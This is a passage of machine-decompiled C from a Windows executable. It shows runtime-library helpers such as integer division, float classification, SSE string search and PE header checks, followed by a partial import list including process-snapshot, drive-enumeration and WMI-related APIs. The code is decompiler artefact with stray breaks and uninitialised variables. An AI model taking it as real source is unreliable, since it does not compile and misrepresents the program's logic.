    // 0x410ea4
    *a2 = v60;
    result = v60;
    goto lab_0x410ea6;
}

// Address range: 0x410ebd - 0x410eec
int32_t function_410ebd(int32_t a1) {
    if (a1 == 1) {
        int32_t result = function_40ab11(); // 0x410edf
        *(int32_t *)result = 33;
        // 0x410eea
        return result;
    }
    int32_t result3 = a1 - 2; // 0x410eca
    if (a1 == 3 || result3 == 0) {
        int32_t result2 = function_40ab11(); // 0x410ed2
        *(int32_t *)result2 = 34;
        return result2;
    }
    // 0x410eea
    return result3;
}

// Address range: 0x410eec - 0x410f8e
int32_t function_410eec(int32_t a1, int32_t a2, float80_t a3, float80_t a4, float80_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    int32_t v1 = 0; // 0x410ef9
    int32_t v2 = 8 * v1; // 0x410efb
    while (*(int32_t *)(v2 + (int32_t)&g69) != a2) {
        // 0x410f04
        v1++;
        if (v1 >= 29) {
            // 0x410f6f
            function_40f3f8();
            return function_410ebd(a1);
        }
        v2 = 8 * v1;
    }
    // 0x410f0c
    function_40f3f8();
    if (*(int32_t *)(v2 + (int32_t)&g70) == 0) {
      lab_0x410f6f_2:
        // 0x410f8a
        return function_410ebd(a1);
    }
    int32_t v3 = function_40a608(); // 0x410f56
    int32_t result = v3; // 0x410f60
    if (v3 == 0) {
        // 0x410f62
        result = function_410ebd(a1);
    }
    // 0x410f8a
    return result;
}

// Address range: 0x410f8e - 0x411062
int32_t function_410f8e(float80_t a1, int32_t a2, int32_t * a3, int32_t result, int32_t a5, int32_t a6) {
    // 0x410f8e
    uint32_t v1; // 0x410f8e
    if ((llvm_ctpop_i8((char)(v1 / 256) & 68) & 1) != 0) {
        // 0x41105a
        *(int32_t *)result = 0;
        return result;
    }
    uint32_t v2 = (int32_t)a3;
    int32_t v3; // 0x410f8e
    if ((v2 & 0x7ff0) == 0) {
        // 0x410fba
        v3 = a2;
        if ((a2 & 0xfffff || (int32_t)(float32_t)a1) != 0) {
            int32_t v4 = (float32_t)a1; // 0x410fe5
            int32_t v5 = -1021; // 0x410fe5
            if ((v2 & 16) == 0) {
                int32_t v6 = 2 * (int32_t)(float32_t)a1; // 0x410ff6
                int32_t v7 = -1022; // 0x410ff8
                int32_t v8 = v6; // 0x410ffd
                int32_t v9 = v7; // 0x410ffd
                while ((v2 & 16) == 0) {
                    // 0x410fe7
                    v6 = 2 * v8;
                    v7 = v9 - 1;
                    v8 = v6;
                    v9 = v7;
                }
                // 0x410fff
                v4 = (float32_t)(float64_t)(int64_t)v6;
                v5 = v7;
            }
            // 0x411006
            function_411062((float80_t)(int80_t)v4, 0xffef, 0);
            // 0x41105a
            *(int32_t *)result = v5;
            return result;
        }
    }
    // 0x411036
    function_411062(a1, v3, 0);
    // 0x41105a
    *(int32_t *)result = (v2 / 16 & 2047) - 1022;
    return result;
}

// Address range: 0x411062 - 0x411091
float80_t function_411062(float80_t result, int32_t a2, int32_t a3) {
    // 0x411062
    return result;
}

// Address range: 0x411091 - 0x4110ef
int32_t function_411091(float80_t a1, int32_t a2, int32_t a3) {
    if (a2 != 0x7ff00000) {
        // 0x4110a9
        if (a2 == -0x100000 == (int32_t)(float32_t)a1 == 0) {
            // 0x4110b8
            return 2;
        }
    } else {
        if ((int32_t)(float32_t)a1 == 0) {
            // 0x4110a6
            return (int32_t)(float32_t)a1 + 1;
        }
    }
    int32_t v1 = a3 & 0x7ff8; // 0x4110c4
    if (v1 == 0x7ff8) {
        // 0x4110b8
        return 3;
    }
    if (v1 != 0x7ff0) {
        // 0x4110b8
        return 0;
    }
    // 0x4110da
    if ((a2 & 0x7ffff || (int32_t)(float32_t)a1) != 0) {
        // 0x4110b8
        return 4;
    }
    // 0x4110b8
    return 0;
}

// Address range: 0x4110ef - 0x411193
int32_t function_4110ef(float80_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = a3 & 0x7ff0; // 0x411100
    if (v1 == 0x7ff0) {
        int32_t result = 512; // 0x4110ef
        int32_t v2 = 4; // 0x4110ef
        int32_t v3; // 0x4110ef
        int32_t v4; // 0x4110ef
        switch (function_411091(a1, v4 & -0x10000 || a3 & 0xffff, v3)) {
            case 3: {
                // 0x411131
                v2 = 2;
            }
            case 2: {
                // 0x411131
                result = v2;
            }
            case 1: {
                // 0x411126
                return result;
            }
            default: {
                // 0x411126
                result = 1;
                return result;
            }
        }
    }
    int32_t v5 = a3 & 0x8000; // 0x41113e
    if (v1 == 0) {
        if ((a2 & 0xfffff) != 0) {
            // 0x411158
            return v5 == 0 ? 128 : 16;
        }
        if ((int32_t)(float32_t)a1 != 0) {
            // 0x411158
            return v5 == 0 ? 128 : 16;
        }
    }
    // 0x411167
    uint32_t v6; // 0x4110ef
    if ((llvm_ctpop_i8((char)(v6 / 256) & 68) & 1) == 0) {
        // 0x411181
        return v5 == 0 ? 256 : 8;
    }
    // 0x411175
    return v5 == 0 ? 64 : 32;
}

// Address range: 0x411193 - 0x411199
bool function_411193(int32_t ProcessorFeature) {
    // 0x411193
    return IsProcessorFeaturePresent(ProcessorFeature);
}

// Address range: 0x4111a0 - 0x4111e3
int32_t function_4111a0(int32_t a1, uint32_t a2) {
    int32_t v1 = *(int32_t *)(a1 + 60) + a1; // 0x4111ae
    uint16_t v2 = *(int16_t *)(v1 + 6); // 0x4111b4
    if (v2 == 0) {
        // 0x4111de
        return 0;
    }
    int32_t v3 = 0; // 0x4111c1
    int32_t v4 = v1 + 24 + (int32_t)*(int16_t *)(v1 + 20);
    uint32_t v5 = *(int32_t *)(v4 + 12); // 0x4111c4
    if (v5 <= a2) {
        // 0x4111cb
        if (*(int32_t *)(v4 + 8) + v5 > a2) {
            // break -> 0x4111de
            break;
        }
    }
    // 0x4111d4
    v3++;
    int32_t v6 = v4 + 40; // 0x4111da
    int32_t result = 0; // 0x4111da
    while (v3 < (int32_t)v2) {
        // 0x4111c4
        v4 = v6;
        v5 = *(int32_t *)(v4 + 12);
        if (v5 <= a2) {
            // 0x4111cb
            result = v4;
            if (*(int32_t *)(v4 + 8) + v5 > a2) {
                // break -> 0x4111de
                break;
            }
        }
        // 0x4111d4
        v3++;
        v6 = v4 + 40;
        result = 0;
    }
    // 0x4111de
    return result;
}

// Address range: 0x4111f0 - 0x4112aa
int32_t function_4111f0(int32_t * a1) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x411205
    __writefsdword(0, (int32_t)&v1);
    if (function_4112b0(0x400000) == 0) {
        // 0x41128f
        __writefsdword(0, v1);
        return 0;
    }
    int32_t v2 = function_4111a0(0x400000, (int32_t)a1 - 0x400000); // 0x411249
    if (v2 == 0) {
        // 0x41128f
        __writefsdword(0, v1);
        return 0;
    }
    // 0x411255
    __writefsdword(0, v1);
    return *(int32_t *)(v2 + 36) > -1;
}

// Address range: 0x4112b0 - 0x4112e3
int32_t function_4112b0(int32_t a1) {
    // 0x4112b0
    if (*(int16_t *)a1 != 0x5a4d) {
        // 0x4112d8
        return 0;
    }
    int32_t v1 = *(int32_t *)(a1 + 60) + a1; // 0x4112c3
    if (*(int32_t *)v1 != 0x4550) {
        // 0x4112d8
        return 0;
    }
    // 0x4112cd
    if (*(int16_t *)(v1 + 24) == 267) {
        // 0x4112d8
        return 1;
    }
    // 0x4112d8
    return 0;
}

// Address range: 0x4112e3 - 0x41131a
int32_t function_4112e3(int32_t a1, int32_t a2) {
    int32_t v1 = __readfsdword(0); // bp-8, 0x4112e4
    int32_t result = &v1; // 0x4112e4
    int32_t v2 = result - a2; // 0x4112ef
    int32_t v3; // 0x4112e3
    *(int32_t *)(v2 - 16) = g112 ^ (int32_t)&v3;
    *(int32_t *)(v2 - 20) = a1;
    __writefsdword(0, result);
    return result;
}

// Address range: 0x411320 - 0x4113b5
int32_t function_411320(uint32_t a1, uint32_t a2, uint32_t a3, int32_t a4) {
    int32_t v1 = a1; // 0x411327
    uint32_t v2 = a4; // 0x411327
    int32_t v3 = a3; // 0x411327
    if (a4 == 0) {
        int32_t result = (0x100000000 * (int64_t)(a2 % a3) | (int64_t)a1) / (int64_t)a3; // 0x41134f
        // 0x411398
        return result;
    }
    v3 = 0x80000000 * (int32_t)((v2 & 1) != 0) | v3 / 2;
    uint32_t v4 = a2 / 2; // 0x411363
    v1 = 0x80000000 * (int32_t)((a2 & 1) != 0) | v1 / 2;
    while (v2 >= 2) {
        // 0x41135f
        v2 /= 2;
        uint32_t v5 = v4;
        v3 = 0x80000000 * (int32_t)((v2 & 1) != 0) | v3 / 2;
        v4 = v5 / 2;
        v1 = 0x80000000 * (int32_t)((v5 & 1) != 0) | v1 / 2;
    }
    uint64_t v6 = (0x100000000 * (int64_t)v4 | (int64_t)v1) / (int64_t)v3; // 0x41136b
    int32_t result2 = v6; // 0x41136b
    uint64_t v7 = (v6 & 0xffffffff) * (int64_t)a3; // 0x411379
    uint32_t v8 = (int32_t)(v7 / 0x100000000); // 0x411379
    uint32_t v9 = result2 * a4 + v8; // 0x41137b
    if (v9 < v8 || v9 > a2 || (int32_t)v7 > a1 == v9 >= a2) {
        // 0x411398
        return result2 - 1;
    }
    // 0x411398
    return result2;
}

// Address range: 0x4113c0 - 0x411409
int32_t function_4113c0(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-8, 0x4113c5
    int32_t result = &v1; // 0x4113c5
    int32_t v2 = result - a3; // 0x4113d8
    int32_t v3; // 0x4113c0
    *(int32_t *)(v2 - 16) = g112 ^ (int32_t)&v3;
    *(int32_t *)(v2 - 20) = (int32_t)a1;
    __writefsdword(0, result);
    return result;
}

// Address range: 0x411409 - 0x41141a
int32_t function_411409(void) {
    // 0x411409
    function_4065ae();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x411414
    return result;
}

// Address range: 0x411420 - 0x411454
int32_t function_411420(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x411420
    return a3 * a1;
}

// Address range: 0x411460 - 0x41148d
int32_t function_411460(int32_t result) {
    int32_t v1 = result;
    uint32_t v2 = (int32_t)&v1; // 0x411461
    uint32_t v3; // 0x411460
    uint32_t v4 = (v3 > v2 ? v3 : v2) - v3;
    int32_t v5; // bp-4096, 0x411460
    for (uint32_t i = (int32_t)&v5; i >= v4; i -= 0x1000) {
        // continue -> 0x411474
    }
    // 0x411479
    *(int32_t *)v4 = result;
    return result;
}

// Address range: 0x411490 - 0x41156f
int32_t function_411490(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a2; // 0x41149d
    int32_t v2 = a1; // 0x41149d
    int32_t v3 = 0; // 0x41149d
    if (a2 < 0) {
        // 0x41149f
        v1 = (int32_t)(a1 != 0) - a2;
        v2 = -a1;
        v3 = 1;
    }
    int32_t v4 = a4; // 0x4114ba
    int32_t v5 = a3; // 0x4114ba
    int32_t v6 = v3; // 0x4114ba
    if (a4 < 0) {
        // 0x4114bc
        v4 = (int32_t)(a3 != 0) - a4;
        v5 = -a3;
        v6 = v3 + 1;
    }
    uint32_t v7 = v5;
    int32_t v8 = v2; // 0x4114d2
    int32_t v9 = v7; // 0x4114d2
    uint32_t v10 = v4; // 0x4114d2
    int32_t v11; // 0x411490
    if (v4 == 0) {
        int32_t v12 = (0x100000000 * (int64_t)(v1 % v7) | (int64_t)v2) / (int64_t)v7; // 0x4114fa
        // 0x411543
        v11 = v12;
        return v6 != 1 ? v11 : -v11;
    }
    v9 = 0x80000000 * (int32_t)((v10 & 1) != 0) | v9 / 2;
    uint32_t v13 = v1 / 2; // 0x41150e
    v8 = 0x80000000 * (int32_t)((v1 & 1) != 0) | v8 / 2;
    while (v10 >= 2) {
        // 0x41150a
        v10 /= 2;
        uint32_t v14 = v13;
        v9 = 0x80000000 * (int32_t)((v10 & 1) != 0) | v9 / 2;
        v13 = v14 / 2;
        v8 = 0x80000000 * (int32_t)((v14 & 1) != 0) | v8 / 2;
    }
    uint64_t v15 = (0x100000000 * (int64_t)v13 | (int64_t)v8) / (int64_t)v9; // 0x411516
    int32_t v16 = v15; // 0x411516
    uint64_t v17 = (v15 & 0xffffffff) * (int64_t)v7; // 0x411524
    uint32_t v18 = (int32_t)(v17 / 0x100000000); // 0x411524
    uint32_t v19 = v4 * v16 + v18; // 0x411526
    if (v19 < v18 || v19 > v1 || v2 < (int32_t)v17 == v19 >= v1) {
        // 0x411543
        v11 = v16 - 1;
        return v6 != 1 ? v11 : -v11;
    }
    // 0x411543
    v11 = v16;
    return v6 != 1 ? v11 : -v11;
}

// Address range: 0x411570 - 0x41158f
int32_t function_411570(void) {
    // 0x411570
    int32_t v1; // 0x411570
    unsigned char v2 = (char)v1; // 0x411570
    int32_t result = 0; // 0x411573
    if (v2 >= 64) {
        // 0x41158a
        return result;
    }
    uint32_t v3 = v1 & 31;
    uint32_t v4; // 0x411570
    if (v2 >= 32) {
        // 0x41158a
        return v4 >> v3;
    }
    if (v3 != 0) {
        uint32_t v5; // 0x411570
        result = v4 << 32 - v3 | v5 >> v3;
    }
    // 0x41158a
    return result;
}

// Address range: 0x411590 - 0x4115a6
int32_t function_411590(void) {
    // 0x411590
    return function_411460((int32_t)&g266);
}

// Address range: 0x4115a6 - 0x4115bc
int32_t function_4115a6(void) {
    // 0x4115a6
    return function_411460((int32_t)&g266);
}

// Address range: 0x4115c0 - 0x4115df
int32_t function_4115c0(void) {
    // 0x4115c0
    int32_t v1; // 0x4115c0
    if ((unsigned char)(char)v1 < 32) {
        // 0x4115ca
        int32_t v2; // 0x4115c0
        return v2 << (uint32_t)(v1 & 31);
    }
    // 0x4115d0
    return 0;
}

// Address range: 0x4115e0 - 0x411695
int32_t function_4115e0(void) {
    // 0x4115e0
    float80_t v1; // 0x4115e0
    float32_t v2 = v1;
    if (g162 != 0) {
        // 0x4115e9
        return __asm_cvttsd2si((int64_t)(int32_t)v2);
    }
    int32_t v3 = v1; // 0x41163b
    if (v3 == 0) {
        // 0x41167f
        int32_t v4; // 0x4115e0
        if ((v4 & 0x7fffffff) == 0) {
            // 0x411693
            return 0;
        }
    }
    // 0x411643
    int32_t result; // 0x4115e0
    if ((int32_t)v2 >= 0) {
        // 0x411667
        result = v3 - (int32_t)((int32_t)(float32_t)0.0 > 0x80000000);
    } else {
        // 0x411649
        result = (int32_t)((int32_t)(float32_t)0.0 - 1 < ((int32_t)(float32_t)0.0 ^ -0x80000000)) + v3;
    }
    // 0x411693
    return result;
}

// Address range: 0x4116a0 - 0x4117d7
int32_t function_4116a0(int32_t a1, unsigned char a2) {
    // 0x4116a0
    if (g162 == 0) {
        int32_t v1 = -1; // 0x4117b6
        int32_t v2 = a1;
        int32_t v3 = 0; // 0x4117b6
        int32_t v4 = v2; // 0x4117b6
        while (v1 != 0) {
            // 0x4117ae
            bool v5; // 0x4116a0
            int32_t v6 = v2 + (v5 ? -1 : 1); // 0x4117b6
            v1--;
            v3 = v1;
            v4 = v6;
            if (*(char *)v2 == 0) {
                // break ->
                break;
            }
            v2 = v6;
            v3 = 0;
            v4 = v2;
        }
        int32_t v7 = v3 ^ -1; // 0x4117c4
        int32_t v8 = v4 - 1;
        int32_t v9 = v8; // 0x4117c4
        while (v7 != 0) {
            int32_t v10 = v8 - 1; // 0x4117c4
            v7--;
            v9 = v10;
            if (*(char *)v8 == a2) {
                // break -> 0x4117d3
                break;
            }
            v8 = v10;
            v9 = v8;
        }
        int32_t v11 = v9 + 1; // 0x4117c6
        return *(char *)v11 == a2 ? v11 : 0;
    }
    int32_t v12 = a2;
    if (g162 == 1) {
        int128_t v13 = __asm_pshuflw(__asm_movd(256 * v12 | v12), 0); // 0x4116c5
        int128_t v14 = __asm_movlhps(v13, v13); // 0x4116ca
        uint32_t v15 = a1 & 15; // 0x4116d2
        int32_t v16 = -1 << v15; // 0x4116db
        int32_t v17 = a1 - v15;
        int32_t v18 = 0;
        int128_t v19; // 0x4116a0
        int128_t v20 = v19;
        int128_t v21 = __asm_movdqu_5(*(int128_t *)v17); // 0x4116dd
        int128_t v22 = __asm_pcmpeqb(__asm_pxor(v20, v20), v21); // 0x4116e5
        int128_t v23 = __asm_pcmpeqb(v21, v14); // 0x4116e9
        int32_t v24 = __asm_pmovmskb(v22) & v16; // 0x4116f1
        int32_t v25 = __asm_pmovmskb(v23) & v16;
        while (v24 == 0) {
            int32_t v26 = v25 == 0 ? v16 : llvm_ctlz_i32(v25, true) ^ 31; // 0x4116fb
            int32_t v27 = v25 != 0 ? v26 + v17 : v18; // 0x411702
            v16 = -1;
            v17 += 16;
            v18 = v27;
            v20 = v22;
            v21 = __asm_movdqu_5(*(int128_t *)v17);
            v22 = __asm_pcmpeqb(__asm_pxor(v20, v20), v21);
            v23 = __asm_pcmpeqb(v21, v14);
            v24 = __asm_pmovmskb(v22) & v16;
            v25 = __asm_pmovmskb(v23) & v16;
        }
        int32_t v28 = 2 * v24; // 0x411714
        int32_t v29 = (v28 & -v28) - 1 & v25; // 0x41171d
        return v29 == 0 ? v18 : (llvm_ctlz_i32(v29, true) ^ 31) + v17;
    }
    if (a2 == 0) {
        int32_t v30 = a1 & -16; // 0x411773
        int128_t v31; // 0x4116a0
        int128_t v32 = __asm_pcmpeqb(__asm_pxor(v31, v31), *(int128_t *)v30); // 0x411779
        int32_t v33 = -1 << (a1 & 15);
        int32_t v34 = __asm_pmovmskb(v32) & v33; // 0x41178f
        int32_t v35 = v30; // 0x411791
        int32_t v36 = v34; // 0x411791
        if (v34 == 0) {
            int128_t v37 = v32;
            int128_t v38 = __asm_pxor(v37, v37); // 0x411793
            int32_t v39 = v30 + 16; // 0x411797
            int128_t v40 = __asm_pcmpeqb(v38, *(int128_t *)v39); // 0x411797
            int32_t v41 = __asm_pmovmskb(v40); // 0x41179f
            int32_t v42 = v39; // 0x4117a5
            v35 = v39;
            v36 = v41;
            while (v41 == 0) {
                // 0x411793
                v37 = v40;
                v38 = __asm_pxor(v37, v37);
                v39 = v42 + 16;
                v40 = __asm_pcmpeqb(v38, *(int128_t *)v39);
                v41 = __asm_pmovmskb(v40);
                v42 = v39;
                v35 = v39;
                v36 = v41;
            }
        }
        int32_t v43 = v36;
        // 0x41176b
        return (v43 == 0 ? v33 : llvm_cttz_i32(v43, true)) + v35;
    }
    int32_t result2 = 0; // 0x41173d
    int32_t v44 = a1; // 0x41173d
    int32_t result = 0; // 0x41173d
    int32_t v45 = a1; // 0x41173d
    if ((a1 & 15) == 0) {
      lab_0x411754:;
        int128_t v46 = __asm_movd(v12); // 0x411754
        int32_t v47 = v45 + 16; // 0x411758
        __asm_pcmpistri(v46, *(int128_t *)v45, 64);
        int32_t v48 = v47; // 0x411769
        while (v47 != 0) {
            // 0x411758
            v47 = v48 + 16;
            __asm_pcmpistri(v46, *(int128_t *)v48, 64);
            v48 = v47;
        }
        // 0x41176b
        return result;
    }
    char v49 = *(char *)v44; // 0x41173f
    result2 = v49 == a2 ? v44 : result2;
    while (v49 != 0) {
        // 0x41174b
        v44++;
        result = result2;
        v45 = v44;
        if ((v44 & 15) == 0) {
            goto lab_0x411754;
        }
        v49 = *(char *)v44;
        result2 = v49 == a2 ? v44 : result2;
    }
    // 0x41176b
    return result2;
}

// Address range: 0x4117e0 - 0x41190b
int32_t function_4117e0(int32_t a1, unsigned char a2) {
    int32_t v1 = a2;
    int32_t v2 = 256 * v1;
    if (g162 != 0) {
        int128_t v3 = __asm_pshuflw(__asm_movd(v2 | v1), 0); // 0x4117f9
        int128_t v4 = __asm_movlhps(v3, v3); // 0x4117fe
        uint32_t v5 = a1 & 15; // 0x41180d
        int32_t v6 = a1 - v5;
        int128_t v7; // 0x4117e0
        int128_t v8 = v7;
        int128_t v9 = __asm_movdqu_5(*(int128_t *)v6); // 0x411813
        int128_t v10 = __asm_por(__asm_pcmpeqb(__asm_pxor(v8, v8), v9), __asm_pcmpeqb(v9, v4)); // 0x411823
        int32_t v11 = __asm_pmovmskb(v10) & -1 << v5; // 0x41182b
        int32_t v12 = -1; // 0x41182d
        int32_t v13 = v6 + 16; // 0x41182d
        while (v11 == 0) {
            // 0x411813
            v6 = v13;
            v8 = v10;
            v9 = __asm_movdqu_5(*(int128_t *)v6);
            v10 = __asm_por(__asm_pcmpeqb(__asm_pxor(v8, v8), v9), __asm_pcmpeqb(v9, v4));
            v11 = __asm_pmovmskb(v10) & v12;
            v12 = -1;
            v13 = v6 + 16;
        }
        int32_t v14 = llvm_cttz_i32(v11, true) + v6; // 0x41183a
        return *(char *)v14 != (char)__asm_movd_7(v4) ? 0 : v14;
    }
    int32_t v15 = a1; // 0x41185e
    int32_t v16 = a1; // 0x41185e
    int32_t result; // 0x4117e0
    if ((a1 & 3) != 0) {
        char v17 = *(char *)v15; // 0x411860
        result = v15;
        while (v17 != a2) {
            // 0x411869
            result = 0;
            if (v17 == 0) {
                // break -> 0x4118be
                break;
            }
            // 0x41186d
            v15++;
            v16 = v15;
            if ((v15 & 3) == 0) {
                goto lab_0x411875;
            }
            v17 = *(char *)v15;
            result = v15;
        }
        // 0x4118be
        return result;
    }
  lab_0x411875:;
    int32_t v18 = v2 | v1; // 0x411875
    int32_t v19 = v16; // 0x41187e
    while (true) {
        int32_t v20 = v19;
        uint32_t v21 = *(int32_t *)v20; // 0x411880
        int32_t v22 = v21 ^ (0x10000 * v18 | v18); // 0x41188b
        if (((v22 ^ -0x7efeff00 ^ v22 + 0x7efefeff) & -0x7efeff00) != 0) {
            char v23 = v21; // 0x4118ca
            result = v20;
            if (v23 == a2) {
                // break -> 0x4118be
                break;
            }
            // 0x4118ce
            result = 0;
            if (v23 == 0) {
                // break -> 0x4118be
                break;
            }
            char v24 = v21 / 256; // 0x4118d2
            if (v24 == a2) {
                // 0x4118fd
                return v20 + 1;
            }
            // 0x4118d6
            result = 0;
            if (v24 == 0) {
                // break -> 0x4118be
                break;
            }
            char v25 = v21 / 0x10000; // 0x4118dd
            if (v25 == a2) {
                // 0x4118f6
                return v20 + 2;
            }
            // 0x4118e1
            result = 0;
            if (v25 == 0) {
                // break -> 0x4118be
                break;
            }
            char v26 = v21 / 0x1000000; // 0x4118e5
            if (v26 == a2) {
                // 0x4118ef
                return v20 + 3;
            }
            // 0x4118e9
            result = 0;
            if (v26 == 0) {
                // break -> 0x4118be
                break;
            }
        } else {
            int32_t v27 = v21 + 0x7efefeff; // 0x41188d
            int32_t v28 = v21 ^ -0x7efeff00 ^ v27; // 0x411899
            if ((v28 & -0x7efeff00) != 0) {
                // 0x4118ad
                result = 0;
                if (v27 <= -1 != ((v28 & 0x1010100) == 0)) {
                    // break -> 0x4118be
                    break;
                }
            }
        }
        // 0x411880
        v19 = v20 + 4;
    }
    // 0x4118be
    return result;
}

// Address range: 0x411910 - 0x4119ba
int32_t function_411910(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = a2; // 0x41191b
    int32_t v2 = a1; // 0x41191b
    int32_t v3 = 0; // 0x41191b
    if (a2 < 0) {
        // 0x41191d
        v1 = (int32_t)(a1 != 0) - a2;
        v2 = -a1;
        v3 = 1;
    }
    int32_t v4 = a4; // 0x411937
    int32_t v5 = a3; // 0x411937
    int32_t v6 = v3; // 0x411937
    if (a4 < 0) {
        // 0x411939
        v4 = (int32_t)(a3 != 0) - a4;
        v5 = -a3;
        v6 = v3 + 1;
    }
    uint32_t v7 = v5;
    int32_t v8 = v2; // 0x41194f
    int32_t v9 = v7; // 0x41194f
    uint32_t v10 = v4; // 0x41194f
    int32_t v11; // 0x411910
    if (v4 == 0) {
        int32_t v12 = (0x100000000 * (int64_t)(v1 % v7) | (int64_t)v2) / (int64_t)v7; // 0x411967
        // 0x4119aa
        v11 = v12;
        return v6 != 1 ? v11 : -v11;
    }
    v9 = 0x80000000 * (int32_t)((v10 & 1) != 0) | v9 / 2;
    uint32_t v13 = v1 / 2; // 0x41197b
    v8 = 0x80000000 * (int32_t)((v1 & 1) != 0) | v8 / 2;
    while (v10 >= 2) {
        // 0x411977
        v10 /= 2;
        uint32_t v14 = v13;
        v9 = 0x80000000 * (int32_t)((v10 & 1) != 0) | v9 / 2;
        v13 = v14 / 2;
        v8 = 0x80000000 * (int32_t)((v14 & 1) != 0) | v8 / 2;
    }
    uint64_t v15 = (0x100000000 * (int64_t)v13 | (int64_t)v8) / (int64_t)v9; // 0x411983
    int32_t v16 = v15; // 0x411983
    uint64_t v17 = (v15 & 0xffffffff) * (int64_t)v7; // 0x411991
    uint32_t v18 = (int32_t)(v17 / 0x100000000); // 0x411991
    uint32_t v19 = v4 * v16 + v18; // 0x411993
    if (v19 < v18 || v19 > v1 || v2 < (int32_t)v17 == v19 >= v1) {
        // 0x4119aa
        v11 = v16 - 1;
        return v6 != 1 ? v11 : -v11;
    }
    // 0x4119aa
    v11 = v16;
    return v6 != 1 ? v11 : -v11;
}

// Address range: 0x4119ba - 0x4119d5
int32_t function_4119ba(int32_t a1) {
    // 0x4119ba
    function_4065ae();
    int32_t result = function_406e97((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x4119d0
    return result;
}

// Address range: 0x4119d5 - 0x4119f0
int32_t function_4119d5(int32_t a1) {
    // 0x4119d5
    function_4065ae();
    int32_t result = function_406e97((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x4119eb
    return result;
}

// Address range: 0x4119f0 - 0x411a4d
int32_t function_4119f0(void) {
    uint32_t v1 = g147; // 0x4119f0
    if (v1 < 8) {
        // 0x411a2b
        g146 = 0;
        g147 = 7;
        *(int16_t *)&g145 = 0;
        return 0;
    }
    int32_t v2 = (int32_t)g145; // 0x4119fb
    int32_t v3 = v2; // 0x411a0d
    if (2 * v1 >= 4094) {
        int32_t v4 = v2 - 4;
        v3 = *(int32_t *)v4;
        if (v4 - v3 >= 32) {
            // 0x411a48
            return function_409683();
        }
    }
    // 0x411a21
    function_405b5b(v3);
    // 0x411a2b
    g146 = 0;
    g147 = 7;
    *(int16_t *)&g145 = 0;
    return 0;
}

// --------------- Dynamically Linked Functions ---------------

// LPWSTR CharLowerW(_Inout_ LPWSTR lpsz);
// BOOL CloseHandle(_In_ HANDLE hObject);
// HRESULT CoCreateInstance(_In_ REFCLSID rclsid, _In_opt_ LPUNKNOWN pUnkOuter, _In_ DWORD dwClsContext, _In_ REFIID riid, LPVOID * ppv);
// HRESULT CoInitialize(_In_opt_ LPVOID pvReserved);
// LPWSTR * CommandLineToArgvW(_In_ LPCWSTR lpCmdLine, _Out_ int * pNumArgs);
// HRESULT CoSetProxyBlanket(_In_ IUnknown * pProxy, _In_ DWORD dwAuthnSvc, _In_ DWORD dwAuthzSvc, _In_opt_ OLECHAR * pServerPrincName, _In_ DWORD dwAuthnLevel, _In_ DWORD dwImpLevel, _In_opt_ RPC_AUTH_IDENTITY_HANDLE pAuthInfo, _In_ DWORD dwCapabilities);
// HANDLE CreateEventW(_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCWSTR lpName);
// HANDLE CreateFileW(_In_ LPCWSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateMutexW(_In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes, _In_ BOOL bInitialOwner, _In_opt_ LPCWSTR lpName);
// HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// PVOID DecodePointer(_In_opt_ PVOID Ptr);
// VOID DeleteCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// PVOID EncodePointer(_In_opt_ PVOID Ptr);
// VOID EnterCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// VOID ExitProcess(_In_ UINT uExitCode);
// BOOL FindClose(_Inout_ HANDLE hFindFile);
// HANDLE FindFirstFileExA(_In_ LPCSTR lpFileName, _In_ FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, _In_ FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, _In_ DWORD dwAdditionalFlags);
// HANDLE FindFirstFileW(_In_ LPCWSTR lpFileName, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// BOOL FindNextFileA(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAA lpFindFileData);
// BOOL FindNextFileW(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// BOOL FlushFileBuffers(_In_ HANDLE hFile);
// BOOL FreeEnvironmentStringsW(_In_ LPWCH penv);
// BOOL FreeLibrary(_In_ HMODULE hLibModule);
// UINT GetACP(void);
// LPSTR GetCommandLineA(VOID);
// LPWSTR GetCommandLineW(VOID);
// UINT GetConsoleCP(VOID);
// BOOL GetConsoleMode(_In_ HANDLE hConsoleHandle, _Out_ LPDWORD lpMode);
// BOOL GetCPInfo(_In_ UINT CodePage, _Out_ LPCPINFO lpCPInfo);
// HANDLE GetCurrentProcess(VOID);
// DWORD GetCurrentProcessId(VOID);
// DWORD GetCurrentThreadId(VOID);
// UINT GetDriveTypeW(_In_opt_ LPCWSTR lpRootPathName);
// LPWCH GetEnvironmentStringsW(void);
// DWORD GetFileAttributesW(_In_ LPCWSTR lpFileName);
// BOOL GetFileSizeEx(_In_ HANDLE hFile, _Out_ PLARGE_INTEGER lpFileSize);
// DWORD GetFileType(_In_ HANDLE hFile);
// DWORD GetLastError(VOID);
// DWORD GetLogicalDriveStringsW(_In_ DWORD nBufferLength, LPWSTR lpBuffer);
